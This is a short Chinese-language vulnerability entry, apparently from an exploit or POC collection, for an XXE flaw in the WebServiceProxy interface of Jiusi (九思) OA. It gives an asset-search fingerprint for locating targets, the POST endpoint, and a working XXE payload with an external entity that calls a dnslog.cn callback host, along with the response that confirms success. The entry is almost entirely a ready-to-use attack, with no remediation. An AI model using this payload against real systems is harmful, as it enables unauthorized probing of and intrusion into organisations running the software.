# 九思OA接口WebServiceProxy存在XXE漏洞

九思OA接口 ｜ XXE ｜ —
- **指纹**：`app="九思软件-OA"`
- **请求**：`POST /jsoa/WebServiceProxy HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://11111.edbxqa.dnslog.cn"> %remote;]>
```
- **响应特征**：200 DNSLOG回显